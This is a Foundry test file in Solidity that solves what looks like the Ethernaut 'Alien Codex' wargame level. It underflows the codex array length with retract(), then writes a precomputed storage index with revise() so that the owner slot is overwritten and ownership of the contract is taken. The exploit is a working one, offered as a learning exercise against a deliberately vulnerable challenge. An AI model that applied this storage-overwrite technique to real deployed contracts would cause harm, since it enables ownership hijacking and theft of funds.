// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {AlienCodex} from "../src/Alien.sol";

contract AlienTest is Test {
    AlienCodex public alien;

    address public addr = 0x70831B5349D6ba601041aA36899A91CFe6C1B02c;

    function setUp() public {
        alien = AlienCodex(addr);
    }

    function testAttack() public {
        alien.makeContact();
        alien.retract();

        uint256 index = 35707666377435648211887908874984608119992236509074197713628505308453184860938;

        alien.revise(index, hex"000000000000000000000001947c5fFb05ed063d6edDc8a604AD99B3df3d599A");

        assertEq(alien.owner(), 0x947c5fFb05ed063d6edDc8a604AD99B3df3d599A);
    }
}

// storage:
//     - 0 slot - address(bytes20) owner
//     - 0 slot - bool contact
//     - 1 slot - bytes32 length of the codex
//     - keccak256(1 slot) - first element
